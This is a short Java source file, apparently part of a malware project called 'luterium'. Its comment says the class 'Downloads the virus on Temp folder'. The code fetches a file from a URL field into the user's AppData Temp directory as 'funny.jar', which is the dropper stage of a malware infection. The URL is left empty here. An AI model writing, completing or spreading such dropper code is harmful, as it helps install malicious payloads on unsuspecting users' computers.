package dev.peter.luterium.features.maintainer;

import dev.peter.luterium.utils.FileUtil;

import java.io.File;

/**
 * @author Peter
 * @since 04/14/2023
 * Downloads the virus on Temp folder.
 */

public class Downloader {
    static FileUtil fileUtil = new FileUtil();

    static String funnyUrl = "";
    static String funnyPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\funny.jar";

    public static void downloadFile() throws Exception {
        fileUtil.downloadFile(funnyUrl, (new File(funnyPath)));
    }
}
